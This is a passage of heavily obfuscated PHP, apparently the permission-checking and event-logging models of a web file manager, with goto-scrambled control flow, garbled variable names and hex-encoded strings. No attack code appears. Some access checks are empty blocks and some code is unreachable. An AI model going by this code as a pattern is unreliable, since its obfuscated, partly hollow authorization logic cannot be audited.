$FÉ³ÔŠÇ«„[$e¼©ƒš‡×[684]] == $e¼©ƒš‡×[2208] ? 1 : 0; $this->shareFileMeta($bêàÀƒ¼Óë[$e¼©ƒš‡×[414]], $Eê³½Ööäá); $this->removeByFile($bêàÀƒ¼Óë[$e¼©ƒš‡×[414]]); } goto a¡¼ŠèËá; fô²ÎíÔ—÷: $e¼©ƒš‡× =& $_SERVER[õëù©û]; $D…ÔÙÖªô† = array($e¼©ƒš‡×[363] => $C‡‚Ö‘¨¶[$e¼©ƒš‡×[363]]); $bêàÀƒ¼Óë = Model($e¼©ƒš‡×[2202])->where($D…ÔÙÖªô†)->field($e¼©ƒš‡×[2211])->find(); goto ašÑŠŞÄÏÜ; a¡¼ŠèËá: return $BšéË‹Å¤¤; goto Bîå¿õß ‚; Bîå¿õß ‚: } private function removeByFile($cÌè©ÄÒ°¹) { goto dóË¦‡±êÔ; DãíÛø‚™: $A¶ñ¼°ÅÏ = array($EÃãù¢˜Ø[365] => array($EÃãù¢˜Ø[7], $BÇ‡êÙŸ÷é), $EÃãù¢˜Ø[441] => 1); $dÄ‹‡—ç’ = Model($EÃãù¢˜Ø[2045])->where($A¶ñ¼°ÅÏ)->field($EÃãù¢˜Ø[436])->select(); if (empty($dÄ‹‡—ç’)) { return; } goto C „öÏ¦˜; dóË¦‡±êÔ: $EÃãù¢˜Ø =& $_SERVER[õëù©û]; $dÄ‹‡—ç’ = Model($EÃãù¢˜Ø[747])->where(array($EÃãù¢˜Ø[414] => $cÌè©ÄÒ°¹))->field($EÃãù¢˜Ø[365])->select(); $BÇ‡êÙŸ÷é = array_to_keyvalue($dÄ‹‡—ç’, $EÃãù¢˜Ø[33], $EÃãù¢˜Ø[365]); goto DãíÛø‚™; C „öÏ¦˜: $B‚¤Âå¾Ÿã = array_to_keyvalue($dÄ‹‡—ç’, $EÃãù¢˜Ø[33], $EÃãù¢˜Ø[436]); $this->remove($B‚¤Âå¾Ÿã); goto d®Á¢ƒ°Á†; d®Á¢ƒ°Á†: } private function shareFileMeta($D±„à˜¢Ä, $dĞéìÙíÕÏ = null) { $DõŠÍÃ˜Š‹ =& $_SERVER[õëù©û]; $a·¸‚«ëôİ = array($DõŠÍÃ˜Š‹[414] => $D±„à˜¢Ä, $DõŠÍÃ˜Š‹[89] => $DõŠÍÃ˜Š‹[2212]); if (is_null($dĞéìÙíÕÏ)) { return Model($DõŠÍÃ˜Š‹[2213])->where($a·¸‚«ëôİ)->find(); } $a·¸‚«ëôİ[$DõŠÍÃ˜Š‹[355]] = $dĞéìÙíÕÏ; Model($DõŠÍÃ˜Š‹[2213])->add($a·¸‚«ëôİ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\x63\x65\137\141\165\164\150"; public function getAuth($aìÂõåôËí) { goto aÏ…Å¡ç; b™ßª°Óæ: return $AË¥•Ì½÷†; goto B®—¡†ˆ¶®; aÏ…Å¡ç: $b„ãÄå–Í£ =& $_SERVER[õëù©û]; $Aƒù“¡‡ƒ = $b„ãÄå–Í£[2214]; $f·ò±ç§Ú“ = array($b„ãÄå–Í£[365] => $aìÂõåôËí); goto aŠ¿î°ÙÌœ; aŠ¿î°ÙÌœ: $C†Á¶¿ÒÁ = $this->field($Aƒù“¡‡ƒ)->order($b„ãÄå–Í£[363])->where($f·ò±ç§Ú“)->select(); $AË¥•Ì½÷† = array(); foreach ($C†Á¶¿ÒÁ as $dÂ¥ŸÂ«÷î) { if (Model($b„ãÄå–Í£[2215])->listData($dÂ¥ŸÂ«÷î[$b„ãÄå–Í£[2196]])) { $AË¥•Ì½÷†[] = $dÂ¥ŸÂ«÷î; } } goto b™ßª°Óæ; B®—¡†ˆ¶®: } public function setAuth($B·æ‡­ò, $A›ã²ùøÌÊ) { goto dñ±êˆ”—; aäĞÃÈ ’: $a˜á¹Œš†Ş = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $AˆôÃ¶ìº¸ = array(); foreach ($A›ã²ùøÌÊ as $F¦É»×˜Ò„) { if (!in_array($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[367]], $a˜á¹Œš†Ş)) { show_json(LNG($B’ÎÁ»àÍŠ[2216]), !1); } if ($cîÑ¿óÎ›¸ != $E«ò¶¹‘Ü±) { if ($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[367]] == SourceModel::TYPE_GROUP) { } if ($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[451]] != 0 && !in_array($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[451]], $b„ä±ùí½‘)) { } } if ($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[451]] == 0) { $F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[367]] = SourceModel::TYPE_USER; } $AˆôÃ¶ìº¸[] = array($B’ÎÁ»àÍŠ[365] => $B·æ‡­ò, $B’ÎÁ»àÍŠ[367] => intval($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[367]]), $B’ÎÁ»àÍŠ[451] => intval($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[451]]), $B’ÎÁ»àÍŠ[2196] => intval($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[2196]]) ? intval($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[2196]]) : 0, $B’ÎÁ»àÍŠ[2197] => intval($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[2197]]) ? intval($F¦É»×˜Ò„[$B’ÎÁ»àÍŠ[2197]]) : -1); } goto A±¹™ô–Ñ; dñ±êˆ”—: $B’ÎÁ»àÍŠ =& $_SERVER[õëù©û]; $a­©–ÖÍ¤« = Model($B’ÎÁ»àÍŠ[1101])->sourceInfo($B·æ‡­ò); if ($a­©–ÖÍ¤«[$B’ÎÁ»àÍŠ[367]] != SourceModel::TYPE_GROUP) { return !1; } goto DÅëŒÊğÍ; DÅëŒÊğÍ: $E«ò¶¹‘Ü± = 1; $cîÑ¿óÎ›¸ = $a­©–ÖÍ¤«[$B’ÎÁ»àÍŠ[451]]; if ($cîÑ¿óÎ›¸ != $E«ò¶¹‘Ü±) { $Dö•ÆÂ¡ = array($B’ÎÁ»àÍŠ[2068] => $cîÑ¿óÎ›¸); $b„ä±ùí½‘ = Model($B’ÎÁ»àÍŠ[2142])->field($B’ÎÁ»àÍŠ[1404])->where($Dö•ÆÂ¡)->select(); $b„ä±ùí½‘ = array_to_keyvalue($b„ä±ùí½‘, $B’ÎÁ»àÍŠ[33], $B’ÎÁ»àÍŠ[1404]); } goto aäĞÃÈ ’; A±¹™ô–Ñ: $this->where(array($B’ÎÁ»àÍŠ[379] => $B·æ‡­ò))->delete(); $this->addAll($AˆôÃ¶ìº¸); return !0; goto a¤•±×ˆáø; a¤•±×ˆáø: } public function authClear($a­®ÑŠ×”°) { $AŠŸÃˆ¡ =& $_SERVER[õëù©û]; $a‰¢ÑÈøŒ¹ = Model($AŠŸÃˆ¡[1101])->sourceInfo($a­®ÑŠ×”°); $dÍ”ñš´ÌÏ = array($a­®ÑŠ×”°); if ($a‰¢ÑÈøŒ¹[$AŠŸÃˆ¡[366]] == $AŠŸÃˆ¡[83]) { $fæ§ø¬©ëê = array($AŠŸÃˆ¡[520] => array($AŠŸÃˆ¡[478], $a‰¢ÑÈøŒ¹[$AŠŸÃˆ¡[454]] . $a­®ÑŠ×”° . $AŠŸÃˆ¡[479])); $dÍ”ñš´ÌÏ = Model($AŠŸÃˆ¡[1101])->field($AŠŸÃˆ¡[379])->where($fæ§ø¬©ëê)->getField($AŠŸÃˆ¡[365], !0); $dÍ”ñš´ÌÏ[] = $a­®ÑŠ×”°; } $this->where(array($AŠŸÃˆ¡[379] => array($AŠŸÃˆ¡[380], $dÍ”ñš´ÌÏ)))->delete(); return !0; } public function get($A‘ß©¤×”±) { $BœÀ¯ğ»ì = $this->getSourceList(array($A‘ß©¤×”±), !0); return $BœÀ¯ğ»ì[0]; } public function getSourceList($ağ‚¦ª¢²Ğ, $B’³îŠ±¾Û = false) { goto a˜Ø»àŸÊ; fïÜ•³åÆ: $b•ôÏ¦ç¦é = array($Dˆˆéˆ¬Ñ[379] => array($Dˆˆéˆ¬Ñ[380], $f¶Ñ†‹·Œ)); $Fâ£‚èÀá = $this->field($eØøåõ„£É)->where($b•ôÏ¦ç¦é)->select(); $Fâ£‚èÀá = array_to_keyvalue_group($Fâ£‚èÀá, $Dˆˆéˆ¬Ñ[365]); goto F•¥¯ÏÄ; F•¥¯ÏÄ: $A‰Í½¦ëõ¹ = array(); foreach ($B’³îŠ±¾Û as $eÇˆêŸãÂÆ => $aïÍ¬­®) { $A‰Í½¦ëõ¹[$eÇˆêŸãÂÆ] = $this->makeSourceAuth($aïÍ¬­®, $Fâ£‚èÀá); } return $A‰Í½¦ëõ¹; goto F‚×ßîòô…; a˜Ø»àŸÊ: $Dˆˆéˆ¬Ñ =& $_SERVER[õëù©û]; if (!$ağ‚¦ª¢²Ğ) { return array(); } $aì¼‰™”Ì = Model($Dˆˆéˆ¬Ñ[1101]); goto a¦¬‘éÌ¬; F Ù…©§£º: $f¶Ñ†‹·Œ = array_values(array_unique($f¶Ñ†‹·Œ)); if (!$f¶Ñ†‹·Œ) { return array(); } $eØøåõ„£É = $Dˆˆéˆ¬Ñ[2218]; goto fïÜ•³åÆ; a¦¬‘éÌ¬: if (!$B’³îŠ±¾Û) { $b•ôÏ¦ç¦é = array($Dˆˆéˆ¬Ñ[379] => array($Dˆˆéˆ¬Ñ[380], $ağ‚¦ª¢²Ğ)); $B’³îŠ±¾Û = $aì¼‰™”Ì->field($Dˆˆéˆ¬Ñ[2217])->where($b•ôÏ¦ç¦é)->select(); $B’³îŠ±¾Û = array_to_keyvalue($B’³îŠ±¾Û, $Dˆˆéˆ¬Ñ[365]); } $f¶Ñ†‹·Œ = $ağ‚¦ª¢²Ğ; foreach ($B’³îŠ±¾Û as $D§¬˜İ­°± => $Bø‚ŸÈ§Ü‘) { $FŒõ»Ñ¹˜Ö = $aì¼‰™”Ì->parentLevelArray($Bø‚ŸÈ§Ü‘[$Dˆˆéˆ¬Ñ[454]]); $f¶Ñ†‹·Œ = array_merge($f¶Ñ†‹·Œ, $FŒõ»Ñ¹˜Ö, array($D§¬˜İ­°±)); } goto F Ù…©§£º; F‚×ßîòô…: } public function authDeepCheck($däÚ‘½÷¼È, $c›ªÕºÕ’õ = false) { $EÅº¿¡›—„ =& $_SERVER[õëù©û]; if (_get($GLOBALS, $EÅº¿¡›—„[452])) { return !1; } $Fìêæ£İÕå = $this->makeAuthDeep(); if (!in_array($däÚ‘½÷¼È, $Fìêæ£İÕå)) { return !1; } return array($EÅº¿¡›—„[373] => -1, $EÅº¿¡›—„[413] => array($EÅº¿¡›—„[381] => $EÅº¿¡›—„[1022], $EÅº¿¡›—„[2074] => $EÅº¿¡›—„[463], $EÅº¿¡›—„[382] => LNG($EÅº¿¡›—„[2219]), $EÅº¿¡›—„[2086] => $EÅº¿¡›—„[2220])); } protected function makeAuthDeep() { goto bÌÄ“ó ïÏ; a÷´¿†·¸á: $c¢¬ÁĞ‰¿¦ = Model($DëŠÒ†¥µ[1101]); $a³è°ê›‚î = Model($DëŠÒ†¥µ[453]); if ($dæ”ä„ß) { $D¿­¶ÄŒÄ¤ = $c¢¬ÁĞ‰¿¦->where(array($DëŠÒ†¥µ[365] => array($DëŠÒ†¥µ[380], $dæ”ä„ß)))->select(); foreach ($D¿­¶ÄŒÄ¤ as $cìÚµä·ã) { $AåÅìöŞõÕ = $c¢¬ÁĞ‰¿¦->parentLevelArray($cìÚµä·ã[$DëŠÒ†¥µ[454]]); $A¨ø¿£à§… = array_merge($A¨ø¿£à§…, $AåÅìöŞõÕ); $e¡‘ô­Áäë[] = $cìÚµä·ã[$DëŠÒ†¥µ[451]]; } } goto AƒÃŠ„Œšµ; cÒôİéõ¤÷: $e¡‘ô­Áäë = array_values(array_unique($e¡‘ô­Áäë)); foreach ($e¡‘ô­Áäë as $BÄ¤ ‚‰Ú”) { $aÓ«Á¶ñÜ = $a³è°ê›‚î->getInfo($BÄ¤ ‚‰Ú”); $A¨ø¿£à§…[] = $aÓ«Á¶ñÜ[$DëŠÒ†¥µ[387]][$DëŠÒ†¥µ[365]]; } $A¨ø¿£à§… = array_values(array_unique($A¨ø¿£à§…)); goto b¸èª´‡; b¸èª´‡: return $A¨ø¿£à§…; goto açæ‡óÛÜª; cª÷ù¸¼—Ó: if ($AÜâó‡§ùÇ) { $FÓòó—èÇ… = array(array($DëŠÒ†¥µ[367] => SourceModel::TYPE_USER, $DëŠÒ†¥µ[451] => USER_ID), array($DëŠÒ†¥µ[367] => SourceModel::TYPE_GROUP, $DëŠÒ†¥µ[451] => array($DëŠÒ†¥µ[380], $AÜâó‡§ùÇ)), $DëŠÒ†¥µ[907] => $DëŠÒ†¥µ[2148]); } if ($E«ŞáŸ‡Ø´) { $FÓòó—èÇ… = array($FÓòó—èÇ…, $DëŠÒ†¥µ[2196] => array($DëŠÒ†¥µ[2222], $E«ŞáŸ‡Ø´)); } $bŒ”Â¦Ğê¸ = $this->field($DëŠÒ†¥µ[2223])->where($FÓòó—èÇ…)->select(); goto b²íßÍ ™; AƒÃŠ„Œšµ: $e¡‘ô­Áäë = array_values(array_unique($e¡‘ô­Áäë)); $AåÔğïÁƒê = $e¡‘ô­Áäë; foreach ($AåÔğïÁƒê as $BÄ¤ ‚‰Ú”) { $aÓ«Á¶ñÜ = $a³è°ê›‚î->getInfo($BÄ¤ ‚‰Ú”); $AåÅìöŞõÕ = $c¢¬ÁĞ‰¿¦->parentLevelArray($aÓ«Á¶ñÜ[$DëŠÒ†¥µ[454]]); $e¡‘ô­Áäë = array_merge($e¡‘ô­Áäë, $AåÅìöŞõÕ); } goto cÒôİéõ¤÷; EÑ…Õ½õá‰: $B÷»•¶ÂˆÀ = Model($DëŠÒ†¥µ[2221])->listData(); $E«ŞáŸ‡Ø´ = array(); foreach ($B÷»•¶ÂˆÀ as $CˆÆ½Î‘ë) { if ($CˆÆ½Î‘ë[$DëŠÒ†¥µ[372]] == 0 && $CˆÆ½Î‘ë[$DëŠÒ†¥µ[2088]] == $DëŠÒ†¥µ[83]) { $E«ŞáŸ‡Ø´[] = $CˆÆ½Î‘ë[$DëŠÒ†¥µ[363]]; } } goto B–¯áŠ½¹ê; b²íßÍ ™: $dæ”ä„ß = array_to_keyvalue($bŒ”Â¦Ğê¸, $DëŠÒ†¥µ[33], $DëŠÒ†¥µ[365]); $A¨ø¿£à§… = array(); $e¡‘ô­Áäë = $AÜâó‡§ùÇ; goto a÷´¿†·¸á; bÌÄ“ó ïÏ: $DëŠÒ†¥µ =& $_SERVER[õëù©û]; static $A¨ø¿£à§… = false; if ($A¨ø¿£à§…) { return $A¨ø¿£à§…; } goto EÑ…Õ½õá‰; B–¯áŠ½¹ê: $AÜâó‡§ùÇ = Session::get($DëŠÒ†¥µ[2180]); $AÜâó‡§ùÇ = array_to_keyvalue($AÜâó‡§ùÇ, $DëŠÒ†¥µ[33], $DëŠÒ†¥µ[2068]); $FÓòó—èÇ… = array($DëŠÒ†¥µ[367] => SourceModel::TYPE_USER, $DëŠÒ†¥µ[451] => USER_ID); goto cª÷ù¸¼—Ó; açæ‡óÛÜª: } private function makeSourceAuth($bèŠ„Ñ¸†“, $eˆ¿­Ğßº) { goto BÄŠ§’—’; C¡à•Û—ôØ: if (!$B¯«†ßâ¦) { $BŒæÁËº© = array_to_keyvalue($BŒæÁËº©, $b““ó¿ÇÅÅ[2068]); $C­Ã‡²®˜§ = $bèŠ„Ñ¸†“[$b““ó¿ÇÅÅ[451]]; $eÎ­¨¤ƒ©Ÿ = isset($BŒæÁËº©[$C­Ã‡²®˜§]) ? $BŒæÁËº©[$C­Ã‡²®˜§] : !1; if ($eÎ­¨¤ƒ©Ÿ) { $B¯«†ßâ¦ = array($b““ó¿ÇÅÅ[2224] => intval($eÎ­¨¤ƒ©Ÿ[$b““ó¿ÇÅÅ[372]][$b““ó¿ÇÅÅ[372]]), $b““ó¿ÇÅÅ[2225] => $eÎ­¨¤ƒ©Ÿ[$b““ó¿ÇÅÅ[372]]); } } if ((!$B¯«†ßâ¦ || $B¯«†ßâ¦[$b““ó¿ÇÅÅ[373]] <= 0) && $bèŠ„Ñ¸†“[$b““ó¿ÇÅÅ[367]] == SourceModel::TYPE_GROUP) { $dœ´¸ä‚ï = $this->authDeepCheck($bèŠ„Ñ¸†“[$b““ó¿ÇÅÅ[365]], $B¯«†ßâ¦); if ($dœ´¸ä‚ï) { $B¯«†ßâ¦ = $dœ´¸ä‚ï; } } return $B¯«†ßâ¦; goto CğÜ­Œ¬ô; BÄŠ§’—’: $b““ó¿ÇÅÅ =& $_SERVER[õëù©û]; $BŒæÁËº© = Session::get($b““ó¿ÇÅÅ[2180]); $E‡˜Ïù“øù = Model($b““ó¿ÇÅÅ[1101])->parentLevelArray($bèŠ„Ñ¸†“[$b““ó¿ÇÅÅ[454]]); goto CÃ±ë±ç¦²; CÃ±ë±ç¦²: $E‡˜Ïù“øù = array_merge(array($bèŠ„Ñ¸†“[$b““ó¿ÇÅÅ[365]]), array_reverse($E‡˜Ïù“øù)); $B¯«†ßâ¦ = !1; foreach ($E‡˜Ïù“øù as $d—¹´ôÂö‰) { if (!isset($eˆ¿­Ğßº[$d—¹´ôÂö‰])) { continue; } $d¹ªİ¯…÷ = $this->authMake($eˆ¿­Ğßº[$d—¹´ôÂö‰]); if ($d¹ªİ¯…÷[$b““ó¿ÇÅÅ[413]]) { $B¯«†ßâ¦ = $d¹ªİ¯…÷; break; } } goto C¡à•Û—ôØ; CğÜ­Œ¬ô: } public function authOwnerApply($b«ñ¦¦Æ¯) { goto BˆÈ°éÂµ; e§•êíæ¡Ç: if (count($FÙ§”Ó¤Şƒ) == 0) { $FÙ§”Ó¤Şƒ = $this->authFolderOwnerGroup($b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[451]]); } $FÙ§”Ó¤Şƒ = array_unique($FÙ§”Ó¤Şƒ); if (AuthModel::authCheckRoot($b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[372]][$fƒ ‚ç£ßá[373]])) { $FÙ§”Ó¤Şƒ[] = USER_ID; } goto a¾ÆƒÂ‚ˆ—; BˆÈ°éÂµ: $fƒ ‚ç£ßá =& $_SERVER[õëù©û]; if (empty($b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[372]]) || isset($b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[2226]]) && $b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[2226]]) { return $b«ñ¦¦Æ¯; } if (AuthModel::authCheckRoot($b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[372]][$fƒ ‚ç£ßá[373]])) { return $b«ñ¦¦Æ¯; } goto B¾ò’éØ‡å; e­‰¿¶’šî: $dŠì™‘Ä¦† = array($fƒ ‚ç£ßá[379] => array($fƒ ‚ç£ßá[380], $bùŠ®„†•ä)); $EùÆ­åƒ± = $this->field($f”ñŸççŠÄ)->where($dŠì™‘Ä¦†)->select(); $EùÆ­åƒ± = array_to_keyvalue_group($EùÆ­åƒ±, $fƒ ‚ç£ßá[365]); goto f“ó¦«‘ÂÇ; a¾ÆƒÂ‚ˆ—: $b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[372]][$fƒ ‚ç£ßá[2228]] = Model($fƒ ‚ç£ßá[469])->userListInfo($FÙ§”Ó¤Şƒ); return $b«ñ¦¦Æ¯; goto Fõ¾ãù¯Ø; f“ó¦«‘ÂÇ: $Bå±Ï¯ÃáÖ = array(); $FÙ§”Ó¤Şƒ = array(); foreach ($EùÆ­åƒ± as $f²å••—‡ç => $cä‚øÕÇœœ) { $eììŞåÆ£÷ = $this->authFolderOwnerUser($cä‚øÕÇœœ); $Bå±Ï¯ÃáÖ[$f²å••—‡ç] = $eììŞåÆ£÷; $FÙ§”Ó¤Şƒ = array_merge($FÙ§”Ó¤Şƒ, $eììŞåÆ£÷[$fƒ ‚ç£ßá[530]]); if ($eììŞåÆ£÷[$fƒ ‚ç£ßá[2227]]) { break; } } goto e§•êíæ¡Ç; B¾ò’éØ‡å: $bùŠ®„†•ä = Model($fƒ ‚ç£ßá[1101])->parentLevelArray($b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[454]]); $bùŠ®„†•ä = array_merge(array($b«ñ¦¦Æ¯[$fƒ ‚ç£ßá[365]]), array_reverse($bùŠ®„†•ä)); $f”ñŸççŠÄ = $fƒ ‚ç£ßá[2218]; goto e­‰¿¶’šî; Fõ¾ãù¯Ø: } private function authFolderOwnerGroup($fö‹·ç„îé) { $fù…•İºŒ =& $_SERVER[õëù©û]; $e²¤ö×”‘ = Model($fù…•İºŒ[2142])->where(array($fù…•İºŒ[2068] => $fö‹·ç„îé))->select(); $B™¶óô‚–ó = array(); if (!$e²¤ö×”‘) { return $B™¶óô‚–ó; } foreach ($e²¤ö×”‘ as $Bõ±½ì³¼†) { $Fëæ’îš¹ = $this->authInfo($Bõ±½ì³¼†); if (AuthModel::authCheckRoot($Fëæ’îš¹[$fù…•İºŒ[372]])) { $B™¶óô‚–ó[] = $Bõ±½ì³¼†[$fù…•İºŒ[1404]]; } } return $B™¶óô‚–ó; } private function authFolderOwnerUser($Fî”Ô´Çğá) { $f‡ÄÏ¢•Ö— =& $_SERVER[õëù©û]; $A‡ñØáÌÖ³ = array(); $AĞ®¢ñˆÅÜ = !1; foreach ($Fî”Ô´Çğá as $fÙ²çà’±Ì) { $aöñ¥†½Üà = $this->authInfo($fÙ²çà’±Ì); if ($fÙ²çà’±Ì[$f‡ÄÏ¢•Ö—[451]] == $f‡ÄÏ¢•Ö—[463]) { $AĞ®¢ñˆÅÜ = !0; } if ($fÙ²çà’±Ì[$f‡ÄÏ¢•Ö—[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($aöñ¥†½Üà[$f‡ÄÏ¢•Ö—[372]])) { $A‡ñØáÌÖ³[] = $fÙ²çà’±Ì[$f‡ÄÏ¢•Ö—[451]]; } } } return array($f‡ÄÏ¢•Ö—[530] => $A‡ñØáÌÖ³, $f‡ÄÏ¢•Ö—[2227] => $AĞ®¢ñˆÅÜ); } public function authMake($C†¸Ù«Õê) { goto a¤±‘”À©º; bÈ¯ßñ“: $d¤ÙêéãÎ = array_to_keyvalue($B¦ˆ¤¤õ¨, $B‚œİÃÜÖ¬[33], $B‚œİÃÜÖ¬[2068]); $bÖÓµ¡»È = 0; $F •»…Ã…ø = 0; goto cßÌéÔìÖ; cßÌéÔìÖ: $c§ˆÎ½âšö = 0; $EİÁ¹â£² = 0; $BíèØÅ«¡· = 0; goto D˜³Ä¹ò¡ä; D êÁÀÚÌõ: $b—’±ªæìÉ = $DáåÇˆ–‚ ? $EİÁ¹â£² : ($A·áËºÈ•Ï ? $BíèØÅ«¡· : $E°òåÔñ–ñ); $EÇ‚ˆ¦‡Ó = array($B‚œİÃÜÖ¬[2224] => intval($BóÖ…»Ñ‡ì), $B‚œİÃÜÖ¬[2225] => $b—’±ªæìÉ); return $EÇ‚ˆ¦‡Ó; goto A¾øğĞÕç¨; F‡ë©ï : $aƒ‰Ğ‹éé = 0; foreach ($C†¸Ù«Õê as $AÌ‚¤­Š) { $b—’±ªæìÉ = $this->authInfo($AÌ‚¤­Š); $C™˜âùÃˆ‰ = $AÌ‚¤­Š[$B‚œİÃÜÖ¬[451]]; $bİƒˆØŠ§» = intval($b—’±ªæìÉ[$B‚œİÃÜÖ¬[372]]); if ($AÌ‚¤­Š[$B‚œİÃÜÖ¬[367]] == SourceModel::TYPE_USER && $C™˜âùÃˆ‰ == USER_ID) { $DáåÇˆ–‚ = !0; $EİÁ¹â£² = $b—’±ªæìÉ; $bÖÓµ¡»È = $bİƒˆØŠ§»; } else { if ($AÌ‚¤­Š[$B‚œİÃÜÖ¬[367]] == SourceModel::TYPE_GROUP && in_array($C™˜âùÃˆ‰, $d¤ÙêéãÎ)) { $A·áËºÈ•Ï = !0; if ($bİƒˆØŠ§» >= $F •»…Ã…ø) { $F •»…Ã…ø = $bİƒˆØŠ§»; $BíèØÅ«¡· = $b—’±ªæìÉ; } } else { if ($C™˜âùÃˆ‰ == $B‚œİÃÜÖ¬[463]) { $aƒ‰Ğ‹éé = !0; $E°òåÔñ–ñ = $b—’±ªæìÉ; $c§ˆÎ½âšö = $bİƒˆØŠ§»; } } } } $BóÖ…»Ñ‡ì = $DáåÇˆ–‚ ? $bÖÓµ¡»È : ($A·áËºÈ•Ï ? $F •»…Ã…ø : $c§ˆÎ½âšö); goto D êÁÀÚÌõ; D˜³Ä¹ò¡ä: $E°òåÔñ–ñ = 0; $DáåÇˆ–‚ = 0; $A·áËºÈ•Ï = 0; goto F‡ë©ï ; a¤±‘”À©º: $B‚œİÃÜÖ¬ =& $_SERVER[õëù©û]; if (!$C†¸Ù«Õê) { return array($B‚œİÃÜÖ¬[373] => 0, $B‚œİÃÜÖ¬[413] => !1); } $B¦ˆ¤¤õ¨ = Session::get($B‚œİÃÜÖ¬[2180]); goto bÈ¯ßñ“; A¾øğĞÕç¨: } public function authTargetInfoMake($FœèèÚŒì÷) { goto cìØ•ƒä¨; CÌ¿ÌÙ¹£: return array($F”Â˜»È¤à[2229] => $Fìø¯ËÓºù, $F”Â˜»È¤à[2230] => $DŸè«†Ëó); goto D¾İÈÛÅ¼Ó; cìØ•ƒä¨: $F”Â˜»È¤à =& $_SERVER[õëù©û]; $Fìø¯ËÓºù = array(); $DŸè«†Ëó = array(); goto eùï‰Ì™æ; eùï‰Ì™æ: foreach ($FœèèÚŒì÷ as $A‘òòÀÈî) { if ($A‘òòÀÈî[$F”Â˜»È¤à[367]] == SourceModel::TYPE_USER) { $Fìø¯ËÓºù[] = intval($A‘òòÀÈî[$F”Â˜»È¤à[451]]); } else { if ($A‘òòÀÈî[$F”Â˜»È¤à[367]] == SourceModel::TYPE_GROUP) { $DŸè«†Ëó[] = intval($A‘òòÀÈî[$F”Â˜»È¤à[451]]); } } } if ($Fìø¯ËÓºù) { $Fìø¯ËÓºù = Model($F”Â˜»È¤à[469])->userListInfo($Fìø¯ËÓºù); } if ($DŸè«†Ëó) { $D¡Õ¬íÕ©‘ = array($F”Â˜»È¤à[2140] => array($F”Â˜»È¤à[380], $DŸè«†Ëó)); $DŸè«†Ëó = Model($F”Â˜»È¤à[453])->field($F”Â˜»È¤à[2153])->where($D¡Õ¬íÕ©‘)->select(); $DŸè«†Ëó = array_to_keyvalue($DŸè«†Ëó, $F”Â˜»È¤à[2068]); } goto CÌ¿ÌÙ¹£; D¾İÈÛÅ¼Ó: } private function authInfo($aîŒ Ì§„) { $FáÑî¦‡«È =& $_SERVER[õëù©û]; if ($aîŒ Ì§„[$FáÑî¦‡«È[2196]]) { $fÉÏ—ë¶ñÎ = Model($FáÑî¦‡«È[2215])->listData($aîŒ Ì§„[$FáÑî¦‡«È[2196]]); if (!$fÉÏ—ë¶ñÎ) { return !1; $F•†¦Ğíù = Model($FáÑî¦‡«È[2215])->listData(); $dëŒ‘ÅŸÂ˜ = array_filter_by_field($F•†¦Ğíù, $FáÑî¦‡«È[372], $FáÑî¦‡«È[463]); return $dëŒ‘ÅŸÂ˜; } $dÌ™ËñŠí = array_field_key($fÉÏ—ë¶ñÎ, array($FáÑî¦‡«È[363], $FáÑî¦‡«È[28], $FáÑî¦‡«È[372], $FáÑî¦‡«È[2086], $FáÑî¦‡«È[2089])); $dÌ™ËñŠí[$FáÑî¦‡«È[2231]] = $aîŒ Ì§„; return $dÌ™ËñŠí; } else { return array($FáÑî¦‡«È[381] => 0, $FáÑî¦‡«È[2074] => $aîŒ Ì§„[$FáÑî¦‡«È[2197]], $FáÑî¦‡«È[382] => $FáÑî¦‡«È[33], $FáÑî¦‡«È[2086] => $FáÑî¦‡«È[2232]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\x63\x65\x5f\145\166\x65\x6e\164"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\x69\155\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\x74", "\146\x75\x6e\x63\164\x69\157\x6e"), array("\x64\145\163\x63", '', "\151\156\163\145\162\x74\x2c\165\x70\x64\141\x74\x65\x2c\x73\x65\x6c\145\x63\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Bôµ‡º¢Ÿ, $e¯‰åæ¨İî, $fÇ÷Ü…ÌÏ¼ = '') { goto d•ÆáğÊÃ‚; DÂ´™±ŞÛª: $AĞ–ŠÛ‰Œ = array($bÅäóÂãî[379] => $Bôµ‡º¢Ÿ, $bÅäóÂãî[2233] => $e‰·Â¾Ä«¥[$bÅäóÂãî[456]], $bÅäóÂãî[2234] => $e‰·Â¾Ä«¥[$bÅäóÂãî[28]], $bÅäóÂãî[461] => $e‰·Â¾Ä«¥[$bÅäóÂãî[461]], $bÅäóÂãî[1395] => USER_ID, $bÅäóÂãî[384] => $e¯‰åæ¨İî, $bÅäóÂãî[1397] => $fÇ÷Ü…ÌÏ¼); $this->addSystemLog($e¯‰åæ¨İî, $AĞ–ŠÛ‰Œ); return $this->add($AĞ–ŠÛ‰Œ); goto A®—±•ª¦é; d•ÆáğÊÃ‚: $bÅäóÂãî =& $_SERVER[õëù©û]; if (!$this->eventSave) { return; } $e‰·Â¾Ä«¥ = Model($bÅäóÂãî[1101])->sourceInfo($Bôµ‡º¢Ÿ); goto E ˜’Ç³·à; E ˜’Ç³·à: if (!$e‰·Â¾Ä«¥) { return !1; } if ($this->isCacheEvent($e‰·Â¾Ä«¥, $e¯‰åæ¨İî)) { return; } if 